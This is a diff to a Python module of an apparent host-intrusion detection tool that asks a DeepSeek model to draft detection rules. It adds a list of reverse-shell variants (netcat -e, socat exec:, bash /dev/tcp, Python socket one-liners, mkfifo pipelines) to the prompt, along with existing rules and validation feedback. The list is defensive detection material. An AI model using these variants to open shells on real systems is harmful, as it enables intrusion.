@@ -22,6 +22,30 @@ ATTACK_TYPES = ('reverse_shell', 'privilege_escalation', 'credential_access',
                 'persistence', 'defense_evasion', 'network_reconnaissance', 'malware',
                 'memory_code_integrity','anonymous_executable','memfd_execution')
 
+# 2.2.47: one rule covers one variant. Models listed every reverse-shell tool in
+# cmd_contains and every indicator in cmd_arg_contains; the keys are ANDed, so
+# "nc -e /bin/sh HOST PORT" (no /dev/tcp, no socket) never matched and no
+# reverse-shell rule ever passed its own test. Each request now names the
+# variants, and the rules already present, so the model writes the next one.
+# 2.2.47: bir kural tek bir varyantı kapsar; mevcut kurallar istemde listelenir.
+VARIANTS = {
+    'reverse_shell': ('bash or sh running a /dev/tcp or /dev/udp redirection inside sh -c / bash -c '
+                      '(cmd_arg_contains "/dev/tcp/")',
+                      'netcat with a program to run: nc -e, nc -c, ncat -e, ncat --sh-exec, nc.traditional -e',
+                      'socat connecting a shell: socat with exec: or EXEC: or system: argument',
+                      'python or python3 -c one-liner with socket and dup2 / pty.spawn',
+                      'perl -e one-liner with Socket / IO::Socket',
+                      'php -r one-liner with fsockopen',
+                      'ruby -e one-liner with TCPSocket',
+                      'mkfifo pipeline feeding sh -i into nc (inside sh -c)',
+                      'telnet pipeline feeding a shell (inside sh -c)',
+                      'openssl s_client pipeline feeding a shell (inside sh -c)',
+                      'awk or gawk with /inet/tcp/',
+                      'lua -e or node -e with a socket and a spawned shell'),
+}
+MAX_KNOWN = 12
+
+
 class DeepSeekError(Exception):
     """Safe, bounded public error codes only."""
 
@@ -134,7 +158,7 @@ def _http_post(url, payload, api_key, timeout):
         raise DeepSeekError('network_or_response_error') from None
 
 
-def _request(prompt, config, confirmed, *, max_tokens=2048):
+def _request(prompt, config, confirmed, *, max_tokens=2048, temperature=0.2):
     config = config or {}
     if confirmed is not True:
         raise DeepSeekError('explicit_network_consent_required')
@@ -150,7 +174,7 @@ def _request(prompt, config, confirmed, *, max_tokens=2048):
     timeout = min(45, max(1, int(config.get('deepseek_timeout', DEFAULT_TIMEOUT))))
     payload = {'model': DEFAULT_MODEL, 'messages': [{'role': 'system', 'content':
                'Return only JSON data. Never execute commands or request secrets.'},
-               {'role': 'user', 'content': prompt}], 'temperature': 0.2,
+               {'role': 'user', 'content': prompt}], 'temperature': temperature,
                'max_tokens': max_tokens, 'response_format': {'type': 'json_object'}}
     try:
         response = _http_post(DEFAULT_ENDPOINT, payload, key, timeout)
@@ -174,7 +198,35 @@ def connection_test(config=None, *, confirmed=False):
     return {'connected': True, 'transport': 'HTTPS', 'model': DEFAULT_MODEL}
 
 
-def generate_rule(technique, attack_type, schema_hint, config=None, *, confirmed=False):
+def _known_text(known):
+    """Rules already present, as compact base_match JSON, bounded in count and size."""
+    lines = []
+    for item in list(known or ())[:MAX_KNOWN]:
+        try:
+            text = json.dumps(item, sort_keys=True, ensure_ascii=False, separators=(',', ':'))
+        except (TypeError, ValueError):
+            continue
+        lines.append('- ' + text[:300])
+    return '\n'.join(lines)
+
+
+def _feedback_text(feedback):
+    """Why the previous reply was refused: Satsuma's own codes and failing synthetic events only."""
+    if not isinstance(feedback, dict):
+        return ''
+    parts = []
+    for error in list(feedback.get('errors') or [])[:10]:
+        parts.append('- ' + str(error)[:160])
+    for case in list(feedback.get('failed') or [])[:6]:
+        if isinstance(case, dict):
+            parts.append('- ' + str(case.get('case'))[:20] + ' event ' + json.dumps(case.get('event'), ensure_ascii=False)[:300]
+                         + (' was not matched' if case.get('case') == 'positive' else ' was wrongly matched'))
+    if feedback.get('duplicate'):
+        parts.append('- the reply repeated a rule that is already present')
+    return '\n'.join(parts)
+
+
+def generate_rule(technique, attack_type, schema_hint, config=None, *, confirmed=False, known=(), feedback=None):
     if technique and not re.fullmatch(r'T\d{4}(?:\.\d{3})?', technique):
         raise DeepSeekError('invalid_mitre_technique')
     if attack_type not in ATTACK_TYPES:
@@ -182,10 +234,10 @@ def generate_rule(technique, attack_type, schema_hint, config=None, *, confirmed
     definition = ''
     if technique:
         from .definitions import technique as describe
-        known = describe(technique)
-        if known:
-            definition = (f' ATT&CK definition: {known["id"]} {known["name"]} (tactics: {", ".join(known["tactics"])}): '
-                          f'{known["description"]}' + (f' {technique} was revoked and replaced by {known["id"]}.' if known.get('revoked_from') else ''))
+        entry = describe(technique)
+        if entry:
+            definition = (f' ATT&CK definition: {entry["id"]} {entry["name"]} (tactics: {", ".join(entry["tactics"])}): '
+                          f'{entry["description"]}' + (f' {technique} was revoked and replaced by {entry["id"]}.' if entry.get('revoked_from') else ''))
     prompt = ('Produce one Satsuma research proposal package matching this JSON schema. '
               'Use CURRENT_TELEMETRY. For process threats use source sys_proc. For memory threats '
               'use source memory and only these implemented action names: memfd_executable, '
@@ -194,6 +246,12 @@ def generate_rule(technique, attack_type, schema_hint, config=None, *, confirmed
               'Anonymous/JIT/memfd observations alone do not establish malware. Detection actions may only be record, evidence, '
               'correlation_request. No ticket, auto_action, execution or scripts. '
               'The response proposal is advisory, never an instruction to execute. '
+              'One rule covers ONE variant of the threat. All base_match keys are ANDed, so a rule that lists '
+              'several tools in cmd_contains and several indicators in cmd_arg_contains only works if EVERY tool '
+              'line carries one of those indicators; when variants need different indicators, write the rule for '
+              'one variant only (for example nc -e alone, or bash with /dev/tcp/ alone). '
+              'cmd is the argv the kernel reports (/proc/PID/cmdline): redirections, pipes and ; are only '
+              'visible inside a shell -c string, so a one-liner test event is written as bash -c \'...\' or sh -c \'...\'. '
               'Matchers are exact, not substrings: cmd_contains is a program name optionally followed by its '
               'arguments in order (e.g. "nc -e", "bash -i", "curl"); the first word must be the program. '
               'Use cmd_arg_contains for a path, address or host anywhere in the arguments (e.g. "/dev/tcp/"). '
@@ -209,5 +267,17 @@ def generate_rule(technique, attack_type, schema_hint, config=None, *, confirmed
               'operator_review true, verification_level fresh_independent_same_target_records, and all four '
               'policy_preconditions. For network threats use network_isolate with target_type network; for files '
               'file_quarantine with target_type file. Only if no intervention is justified use record with target_type none. Do not write scoring, threshold or base_score: base_match alone decides a match. '
-              f'MITRE: {technique or "unspecified"}; threat: {attack_type}.{definition} Schema: {schema_hint}')
-    return _request(prompt, config, confirmed)
+              f'MITRE: {technique or "unspecified"}; threat: {attack_type}.{definition} ')
+    if attack_type in VARIANTS:
+        prompt += 'Known variants of this threat: ' + '; '.join(VARIANTS[attack_type]) + '. '
+    known_text = _known_text(known)
+    if known_text:
+        prompt += ('These base_match rules already exist on this machine; do not repeat them or their variant. '
+                   'Choose a variant that none of them catches and give it a new rule_id:\n' + known_text + '\n')
+    feedback_text = _feedback_text(feedback)
+    if feedback_text:
+        prompt += ('Your previous reply was refused by Satsuma\'s local validation. Correct it; '
+                   'keep to one variant so every positive event satisfies every base_match key:\n' + feedback_text + '\n')
+    prompt += f'Schema: {schema_hint}'
+    # A little variety: the same prompt at 0.2 returned the same rule every time.
+    return _request(prompt, config, confirmed, temperature=0.7 if (known_text or feedback_text) else 0.4)
